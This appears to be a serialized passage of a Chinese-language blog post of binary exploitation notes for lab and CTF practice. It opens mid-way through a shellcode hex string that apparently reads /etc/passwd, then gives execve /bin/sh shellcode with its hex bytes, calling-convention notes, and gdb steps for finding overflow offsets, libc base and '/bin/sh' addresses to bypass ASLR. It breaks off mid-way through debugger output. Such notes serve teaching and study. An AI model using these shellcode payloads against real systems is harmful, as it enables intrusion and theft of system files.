class=\"line\">6\\x81\\xec\\xff\\x0f\\x48\\x8d\\x34\\x24\\x48\\x89\\xc7\\x48\\x31\\xd2\\x66\\xba\\xff\\x </span><br><span class=\"line\">0f\\x48\\x31\\xc0\\x0f\\x05\\x48\\x31\\xff\\x40\\x80\\xc7\\x01\\x48\\x89\\xc2\\x48\\x31\\ </span><br><span class=\"line\">xc0\\x04\\x01\\x0f\\x05\\x48\\x31\\xc0\\x04\\x3c\\x0f\\x05\\xe8\\xbc\\xff\\xff\\xff\\x2f </span><br><span class=\"line\">\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\\x41</span><br></pre></td></tr></table></figure>\n<p>execve /bin/sh</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.global _start</span><br><span class=\"line\">_start:</span><br><span class=\"line\">    xor %esi, %esi</span><br><span class=\"line\">    # /bin//sh</span><br><span class=\"line\">    movabs $0x68732f2f6e69622f, %rbx</span><br><span class=\"line\">    push %rsi</span><br><span class=\"line\">    push %rbx</span><br><span class=\"line\">    push %rsp</span><br><span class=\"line\">    pop %rdi</span><br><span class=\"line\">    pushq $59</span><br><span class=\"line\">    pop %rax</span><br><span class=\"line\">    xor %edx, %edx</span><br><span class=\"line\">    syscall</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ vim sh.s</span><br><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ as sh.s -o sh.s.o</span><br><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ld sh.s.o -o sh</span><br><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ./sh</span><br><span class=\"line\">$ asd</span><br><span class=\"line\">sh: 1: asd: not found</span><br><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ for i in $(objdump -d sh | grep &quot;^ &quot; | cut -f2); do echo -n &apos;\\x&apos;$i; done; echo</span><br><span class=\"line\">\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05</span><br></pre></td></tr></table></figure>\n<h2 id=\"retn和leave和call\"><a href=\"#retn和leave和call\" class=\"headerlink\" title=\"retn和leave和call\"></a>retn和leave和call</h2><p>retn: </p>\n<blockquote>\n<p>64位: pop rip;  rsp = rsp + 8</p>\n<p>32位: pop eip; esp = esp + 4</p>\n<p>retn N操作：先eip=[esp]，然后esp=esp+4+N</p>\n</blockquote>\n<p>leave:</p>\n<blockquote>\n<p>64位: move rsp rbp; pop rbp               将rbp中的值传给rsp</p>\n<p>32位: move esp ebp; pop ebp             将ebp中的值传给esp</p>\n</blockquote>\n<p>call:</p>\n<blockquote>\n<p>64位: push rip; jump 目的位置</p>\n<p>32位: push eip; jump 目的位置</p>\n</blockquote>\n<h2 id=\"32位寻找偏移\"><a href=\"#32位寻找偏移\" class=\"headerlink\" title=\"32位寻找偏移\"></a>32位寻找偏移</h2><blockquote>\n<p>pattern_create 50</p>\n<p>pattern_offset 字符串</p>\n</blockquote>\n<h2 id=\"有符号整数比较和无符号整数比较\"><a href=\"#有符号整数比较和无符号整数比较\" class=\"headerlink\" title=\"有符号整数比较和无符号整数比较\"></a>有符号整数比较和无符号整数比较</h2><table>\n<thead>\n<tr>\n<th>指令</th>\n<th>含义</th>\n<th>运算符号</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>jbe</td>\n<td>unsigned below or equal (lower or same)</td>\n<td>&lt;=</td>\n</tr>\n<tr>\n<td>jae</td>\n<td>unsigned above or equal (higher or same)</td>\n<td>&gt;=</td>\n</tr>\n<tr>\n<td>jb</td>\n<td>unsigned below (lower)</td>\n<td>&lt;</td>\n</tr>\n<tr>\n<td>ja</td>\n<td>unsigned above (higher)</td>\n<td>&gt;</td>\n</tr>\n<tr>\n<td>jle</td>\n<td>signed less or equal</td>\n<td>&lt;=</td>\n</tr>\n<tr>\n<td>jge</td>\n<td>signed greater or equal</td>\n<td>&gt;=</td>\n</tr>\n<tr>\n<td>jl</td>\n<td>signed less than</td>\n<td>&lt;</td>\n</tr>\n<tr>\n<td>jg</td>\n<td>signed greater than</td>\n<td>&gt;</td>\n</tr>\n</tbody>\n</table>\n<p>从上面的表中可以看出，</p>\n<p>对于无符号（unsigned）整数比较，使用的是单词是above或below；<br>对于有符号(signed)整数比较，则使用的单词是greater或less。</p>\n<h2 id=\"查找argv-0-变量的地址\"><a href=\"#查找argv-0-变量的地址\" class=\"headerlink\" title=\"查找argv[0]变量的地址\"></a>查找argv[0]变量的地址</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gdb-peda$ find /home</span><br><span class=\"line\">Searching for &apos;/home&apos; in: None ranges</span><br><span class=\"line\">Found 6 results, display max 6 items:</span><br><span class=\"line\">[stack] : 0x7fffffffdff6 (&quot;/home/tianji/Desktop/pwn/jarvis/smashes/smashes&quot;)</span><br><span class=\"line\">[stack] : 0x7fffffffe8f4 (&quot;/home/tianji/Desktop/pwn/jarvis&quot;)</span><br><span class=\"line\">[stack] : 0x7fffffffeb12 (&quot;/home/tianji/Desktop/pwn/jarvis/smashes&quot;)</span><br><span class=\"line\">[stack] : 0x7fffffffeb48 (&quot;/home/tianji&quot;)</span><br><span class=\"line\">[stack] : 0x7fffffffeee7 (&quot;/home/tianji/.vimpkg/bin&quot;)</span><br><span class=\"line\">[stack] : 0x7fffffffefc8 (&quot;/home/tianji/Desktop/pwn/jarvis/smashes/smashes&quot;)</span><br><span class=\"line\">gdb-peda$ find 0x7fffffffdff6</span><br><span class=\"line\">Searching for &apos;0x7fffffffdff6&apos; in: None ranges</span><br><span class=\"line\">Found 2 results, display max 2 items:</span><br><span class=\"line\">   libc : 0x7ffff7dd0508 --&gt; 0x7fffffffdff6 (&quot;/home/tianji/Desktop/pwn/jarvis/smashes/smashes&quot;)</span><br><span class=\"line\">[stack] : 0x7fffffffdc68 --&gt; 0x7fffffffdff6 (&quot;/home/tianji/Desktop/pwn/jarvis/smashes/smashes&quot;)</span><br><span class=\"line\">gdb-peda$ distance $rsp 0x7fffffffdc68</span><br><span class=\"line\">From 0x7fffffffda50 to 0x7fffffffdc68: 536 bytes, 134 dwords</span><br></pre></td></tr></table></figure>\n<p>首先搜索字符串”/home”,第一个地址是真实地址，在搜索指向该地址的指针，该指针也就是我们要找的argv[0]的地址。</p>\n<p>当前$rsp的值就是 存在栈溢出变量的地址</p>\n<h2 id=\"ubuntu-16-64位默认加载地址\"><a href=\"#ubuntu-16-64位默认加载地址\" class=\"headerlink\" title=\"ubuntu 16  64位默认加载地址\"></a>ubuntu 16  64位默认加载地址</h2><p>运行程序，然后查看 /proc/pid/maps</p>\n","site":{"data":{}},"excerpt":"<h2 id=\"调用约定\"><a href=\"#调用约定\" class=\"headerlink\" title=\"调用约定\"></a>调用约定</h2><p>32位和64位程序的区别, 更多的是体现在<a href=\"https://en.wikipedia.org/wiki/X86_calling_conventions\" target=\"_blank\" rel=\"noopener\">调用约定(Calling Convention)</a>上. 因为64位程序有了更多的通用寄存器, 所以通常会使用寄存器来进行函数参数传递 而不是通过栈, 来获得更高的运行速度.</p>\n<p>本文主要是介绍Linux平台下的漏洞利用, 所以就专注于<code>System V AMD64 ABI</code> 的调用约定, 即函数参数从左到右依次用寄存器RDI,RSI,RDX,RCX,R8,R9来进行传递, 如果参数个数多于6个, 再通过栈来进行传递.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ cat victim.c</span><br><span class=\"line\">int foo(int a, int b, int c,  int d,  int e,  int f,  int g,  int h) &#123;</span><br><span class=\"line\">    return a + b + c + d + e + f + g + h;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int main() &#123;</span><br><span class=\"line\">    foo(1, 2, 3, 4, 5, 6, 7, 8);</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$ gcc victim.c -o victim</span><br><span class=\"line\">$ objdump -d victim | grep &quot;&lt;main&gt;:&quot; -A 11</span><br><span class=\"line\">00000000000006a0 &lt;main&gt;:</span><br><span class=\"line\"> 6a0:   55                      push   rbp</span><br><span class=\"line\"> 6a1:   48 89 e5                mov    rbp,rsp</span><br><span class=\"line\"> 6a4:   6a 08                   push   0x8</span><br><span class=\"line\"> 6a6:   6a 07                   push   0x7</span><br><span class=\"line\"> 6a8:   41 b9 06 00 00 00       mov    r9d,0x6</span><br><span class=\"line\"> 6ae:   41 b8 05 00 00 00       mov    r8d,0x5</span><br><span class=\"line\"> 6b4:   b9 04 00 00 00          mov    ecx,0x4</span><br><span class=\"line\"> 6b9:   ba 03 00 00 00          mov    edx,0x3</span><br><span class=\"line\"> 6be:   be 02 00 00 00          mov    esi,0x2</span><br><span class=\"line\"> 6c3:   bf 01 00 00 00          mov    edi,0x1</span><br><span class=\"line\"> 6c8:   e8 93 ff ff ff          call   660 &lt;foo&gt;</span><br></pre></td></tr></table></figure>","more":"<h2 id=\"查找libc基地址\"><a href=\"#查找libc基地址\" class=\"headerlink\" title=\"查找libc基地址\"></a>查找libc基地址</h2><p>方法一:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ LD_TRACE_LOADED_OBJECTS=1 ./vuln</span><br><span class=\"line\">\tlinux-vdso.so.1 (0x00007ffff7ffa000)</span><br><span class=\"line\">\tlibc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff79e4000)</span><br><span class=\"line\">\t/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd5000)</span><br></pre></td></tr></table></figure>\n<p>方法二:</p>\n<p>首先查找libc中某一函数的偏移，以system为例:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system@</span><br><span class=\"line\">   607: 000000000004f440    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE</span><br><span class=\"line\">  1403: 000000000004f440    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5</span><br></pre></td></tr></table></figure>\n<p>或者使用ida也可以查找函数的偏移。</p>\n<p>寻找system的绝对地址：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln</span><br><span class=\"line\">Catchpoint 1 (exec)</span><br><span class=\"line\">Reading symbols from vuln...done.</span><br><span class=\"line\">gdb-peda$ p system</span><br><span class=\"line\">$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0x5d0 &lt;system@plt&gt;</span><br><span class=\"line\">gdb-peda$ r</span><br><span class=\"line\">Starting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln </span><br><span class=\"line\">asdf</span><br><span class=\"line\">asdf</span><br><span class=\"line\"></span><br><span class=\"line\">[Inferior 1 (process 7107) exited normally]</span><br><span class=\"line\">Warning: not running or target is remote</span><br><span class=\"line\">gdb-peda$ p system</span><br><span class=\"line\">$2 = &#123;int (const char *)&#125; 0x7ffff7a33440 &lt;__libc_system&gt;</span><br></pre></td></tr></table></figure>\n<p>然后就可以计算libc的基地址:</p>\n<blockquote>\n<p> 0x7ffff7a33440 - 0x4f440 = 0x7ffff79e4000</p>\n</blockquote>\n<h2 id=\"查找”-bin-sh”的偏移地址\"><a href=\"#查找”-bin-sh”的偏移地址\" class=\"headerlink\" title=\"查找”/bin/sh”的偏移地址\"></a>查找”/bin/sh”的偏移地址</h2><p>方法一:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rafind2 -z -s /bin/sh /lib/x86_64-linux-gnu/libc.so.6</span><br><span class=\"line\">0x1b3e9a</span><br></pre></td></tr></table></figure>\n<p>方法二:</p>\n<p>在ida中查找。</p>\n<p>方法三:</p>\n<p>在环境变量中查找。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln</span><br><span class=\"line\">Catchpoint 1 (exec)</span><br><span class=\"line\">Reading symbols from vuln...done.</span><br><span class=\"line\"><span class=\"meta\">gdb-peda$</span> b *main</span><br><span class=\"line\">Breakpoint 2 at 0x555555554739: file vuln.c, line 17.</span><br><span class=\"line\"><span class=\"meta\">gdb-peda$</span> r</span><br><span class=\"line\">Starting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln </span><br><span class=\"line\"></span><br><span class=\"line\">[----------------------------------registers-----------------------------------]</span><br><span class=\"line\">RAX: 0x555555554739 (&lt;main&gt;:\tpush   rbp)</span><br><span class=\"line\">RBX: 0x0 </span><br><span class=\"line\">RCX: 0x555555554790 (&lt;__libc_csu_init&gt;:\tpush   r15)</span><br><span class=\"line\">RDX: 0x7fffffffddf8 --&gt; 0x7fffffffe1c7 (\"CLUTTER_IM_MODULE=xim\")</span><br><span class=\"line\">RSI: 0x7fffffffdde8 --&gt; 0x7fffffffe199 (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")</span><br><span class=\"line\">RDI: 0x1 </span><br><span class=\"line\">RBP: 0x555555554790 (&lt;__libc_csu_init&gt;:\tpush   r15)</span><br><span class=\"line\">RSP: 0x7fffffffdd08 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:\tmov    edi,eax)</span><br><span class=\"line\">RIP: 0x555555554739 (&lt;main&gt;:\tpush   rbp)</span><br><span class=\"line\">R8 : 0x7ffff7dd0d80 --&gt; 0x0 </span><br><span class=\"line\">R9 : 0x7ffff7dd0d80 --&gt; 0x0 </span><br><span class=\"line\">R10: 0x0 </span><br><span class=\"line\">R11: 0x1 </span><br><span class=\"line\">R12: 0x555555554610 (&lt;_start&gt;:\txor    ebp,ebp)</span><br><span class=\"line\">R13: 0x7fffffffdde0 --&gt; 0x1 </span><br><span class=\"line\">R14: 0x0 </span><br><span class=\"line\">R15: 0x0</span><br><span class=\"line\">EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class=\"line\">[-------------------------------------code-------------------------------------]</span><br><span class=\"line\">   0x55555555472a &lt;shell+16&gt;:\tcall   0x5555555545d0 &lt;system@plt&gt;</span><br><span class=\"line\">   0x55555555472f &lt;shell+21&gt;:\tmov    edi,0x0</span><br><span class=\"line\">   0x555555554734 &lt;shell+26&gt;:\tcall   0x5555555545f0 &lt;exit@plt&gt;</span><br><span class=\"line\">=&gt; 0x555555554739 &lt;main&gt;:\tpush   rbp</span><br><span class=\"line\">   0x55555555473a &lt;main+1&gt;:\tmov    rbp,rsp</span><br><span class=\"line\">   0x55555555473d &lt;main+4&gt;:\tsub    rsp,0x120</span><br><span class=\"line\">   0x555555554744 &lt;main+11&gt;:\tmov    DWORD PTR [rbp-0x114],edi</span><br><span class=\"line\">   0x55555555474a &lt;main+17&gt;:\tmov    QWORD PTR [rbp-0x120],rsi</span><br><span class=\"line\">[------------------------------------stack-------------------------------------]</span><br><span class=\"line\">0000| 0x7fffffffdd08 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:\tmov    edi,eax)</span><br><span class=\"line\">0008| 0x7fffffffdd10 --&gt; 0x1 </span><br><span class=\"line\">0016| 0x7fffffffdd18 --&gt; 0x7fffffffdde8 --&gt; 0x7fffffffe199 (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")</span><br><span class=\"line\">0024| 0x7fffffffdd20 --&gt; 0x100008000 </span><br><span class=\"line\">0032| 0x7fffffffdd28 --&gt; 0x555555554739 (&lt;main&gt;:\tpush   rbp)</span><br><span class=\"line\">0040| 0x7fffffffdd30 --&gt; 0x0 </span><br><span class=\"line\">0048| 0x7fffffffdd38 --&gt; 0xbd88a50cb0fd83be </span><br><span class=\"line\">0056| 0x7fffffffdd40 --&gt; 0x555555554610 (&lt;_start&gt;:\txor    ebp,ebp)</span><br><span class=\"line\">[------------------------------------------------------------------------------]</span><br><span class=\"line\">Legend: code, data, rodata, value</span><br><span class=\"line\"></span><br><span class=\"line\">Breakpoint 2, main (argc=0x7fff, argv=0x0) at vuln.c:17</span><br><span class=\"line\">warning: Source file is more recent than executable.</span><br><span class=\"line\">17\tint main(int argc, char* argv[]) &#123;</span><br><span class=\"line\"><span class=\"meta\">gdb-peda$</span> telescope 100</span><br><span class=\"line\">0000| 0x7fffffffdd08 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:\tmov    edi,eax)</span><br><span class=\"line\">0008| 0x7fffffffdd10 --&gt; 0x1 </span><br><span class=\"line\">0016| 0x7fffffffdd18 --&gt; 0x7fffffffdde8 --&gt; 0x7fffffffe199 (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")</span><br><span class=\"line\">0024| 0x7fffffffdd20 --&gt; 0x100008000 </span><br><span class=\"line\">0032| 0x7fffffffdd28 --&gt; 0x555555554739 (&lt;main&gt;:\tpush   rbp)</span><br><span class=\"line\">0040| 0x7fffffffdd30 --&gt; 0x0 </span><br><span class=\"line\">0048| 0x7fffffffdd38 --&gt; 0xbd88a50cb0fd83be </span><br><span class=\"line\">0056| 0x7fffffffdd40 --&gt; 0x555555554610 (&lt;_start&gt;:\txor    ebp,ebp)</span><br><span class=\"line\">0064| 0x7fffffffdd48 --&gt; 0x7fffffffdde0 --&gt; 0x1 </span><br><span class=\"line\">0072| 0x7fffffffdd50 --&gt; 0x0 </span><br><span class=\"line\">0080| 0x7fffffffdd58 --&gt; 0x0 </span><br><span class=\"line\">0088| 0x7fffffffdd60 --&gt; 0xe8ddf05985fd83be </span><br><span class=\"line\">0096| 0x7fffffffdd68 --&gt; 0xe8dde0e6894383be </span><br><span class=\"line\">0104| 0x7fffffffdd70 --&gt; 0x7fff00000000 </span><br><span class=\"line\">0112| 0x7fffffffdd78 --&gt; 0x0 </span><br><span class=\"line\">0120| 0x7fffffffdd80 --&gt; 0x0 </span><br><span class=\"line\">0128| 0x7fffffffdd88 --&gt; 0x7ffff7de5733 (&lt;_dl_init+259&gt;:\tadd    r14,0x8)</span><br><span class=\"line\">0136| 0x7fffffffdd90 --&gt; 0x7ffff7dcb638 --&gt; 0x7ffff7b7de10 --&gt; 0x8348535554415541 </span><br><span class=\"line\">0144| 0x7fffffffdd98 --&gt; 0x2225ab63 </span><br><span class=\"line\">0152| 0x7fffffffdda0 --&gt; 0x0 </span><br><span class=\"line\">0160| 0x7fffffffdda8 --&gt; 0x0 </span><br><span class=\"line\">0168| 0x7fffffffddb0 --&gt; 0x0 </span><br><span class=\"line\">0176| 0x7fffffffddb8 --&gt; 0x555555554610 (&lt;_start&gt;:\txor    ebp,ebp)</span><br><span class=\"line\">0184| 0x7fffffffddc0 --&gt; 0x7fffffffdde0 --&gt; 0x1 </span><br><span class=\"line\">0192| 0x7fffffffddc8 --&gt; 0x55555555463a (&lt;_start+42&gt;:\thlt)</span><br><span class=\"line\">--More--(25/100)</span><br><span class=\"line\">0200| 0x7fffffffddd0 --&gt; 0x7fffffffddd8 --&gt; 0x1c </span><br><span class=\"line\">0208| 0x7fffffffddd8 --&gt; 0x1c </span><br><span class=\"line\">0216| 0x7fffffffdde0 --&gt; 0x1 </span><br><span class=\"line\">0224| 0x7fffffffdde8 --&gt; 0x7fffffffe199 (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")</span><br><span class=\"line\">0232| 0x7fffffffddf0 --&gt; 0x0 </span><br><span class=\"line\">0240| 0x7fffffffddf8 --&gt; 0x7fffffffe1c7 (\"CLUTTER_IM_MODULE=xim\")</span><br><span class=\"line\">0248| 0x7fffffffde00 --&gt; 0x7fffffffe1dd (\"LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc\"...)</span><br><span class=\"line\">0256| 0x7fffffffde08 --&gt; 0x7fffffffe7c9 (\"LC_MEASUREMENT=zh_CN.UTF-8\")</span><br><span class=\"line\">0264| 0x7fffffffde10 --&gt; 0x7fffffffe7e4 (\"LESSCLOSE=/usr/bin/lesspipe %s %s\")</span><br><span class=\"line\">0272| 0x7fffffffde18 --&gt; 0x7fffffffe806 (\"LC_PAPER=zh_CN.UTF-8\")</span><br><span class=\"line\">0280| 0x7fffffffde20 --&gt; 0x7fffffffe81b (\"LC_MONETARY=zh_CN.UTF-8\")</span><br><span class=\"line\">0288| 0x7fffffffde28 --&gt; 0x7fffffffe833 (\"XDG_MENU_PREFIX=gnome-\")</span><br><span class=\"line\">0296| 0x7fffffffde30 --&gt; 0x7fffffffe84a (\"_=/usr/bin/gdb\")</span><br><span class=\"line\">0304| 0x7fffffffde38 --&gt; 0x7fffffffe859 (\"LANG=en_US.UTF-8\")</span><br><span class=\"line\">0312| 0x7fffffffde40 --&gt; 0x7fffffffe86a (\"DISPLAY=:0\")</span><br><span class=\"line\">0320| 0x7fffffffde48 --&gt; 0x7fffffffe875 (\"OLDPWD=/home/tianji/Desktop/sploit\")</span><br><span class=\"line\">0328| 0x7fffffffde50 --&gt; 0x7fffffffe898 (\"GNOME_SHELL_SESSION_MODE=ubuntu\")</span><br><span class=\"line\">0336| 0x7fffffffde58 --&gt; 0x7fffffffe8b8 (\"COLORTERM=truecolor\")</span><br><span class=\"line\">0344| 0x7fffffffde60 --&gt; 0x7fffffffe8cc (\"USERNAME=tianji\")</span><br><span class=\"line\">0352| 0x7fffffffde68 --&gt; 0x7fffffffe8dc (\"XDG_VTNR=1\")</span><br><span class=\"line\">0360| 0x7fffffffde70 --&gt; 0x7fffffffe8e7 (\"SSH_AUTH_SOCK=/run/user/1000/keyring/ssh\")</span><br><span class=\"line\">0368| 0x7fffffffde78 --&gt; 0x7fffffffe910 (\"MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path\")</span><br><span class=\"line\">0376| 0x7fffffffde80 --&gt; 0x7fffffffe946 (\"LC_NAME=zh_CN.UTF-8\")</span><br><span class=\"line\">0384| 0x7fffffffde88 --&gt; 0x7fffffffe95a (\"XDG_SESSION_ID=1\")</span><br><span class=\"line\">0392| 0x7fffffffde90 --&gt; 0x7fffffffe96b (\"USER=tianji\")</span><br><span class=\"line\">--More--(50/100)</span><br><span class=\"line\">0400| 0x7fffffffde98 --&gt; 0x7fffffffe977 (\"DESKTOP_SESSION=ubuntu\")</span><br><span class=\"line\">0408| 0x7fffffffdea0 --&gt; 0x7fffffffe98e (\"QT4_IM_MODULE=fcitx\")</span><br><span class=\"line\">0416| 0x7fffffffdea8 --&gt; 0x7fffffffe9a2 (\"TEXTDOMAINDIR=/usr/share/locale/\")</span><br><span class=\"line\">0424| 0x7fffffffdeb0 --&gt; 0x7fffffffe9c3 (\"GNOME_TERMINAL_SCREEN=/org/gnome/Terminal/screen/d3da222f_3cd5_4897_a029_a411cbf1e9fa\")</span><br><span class=\"line\">0432| 0x7fffffffdeb8 --&gt; 0x7fffffffea19 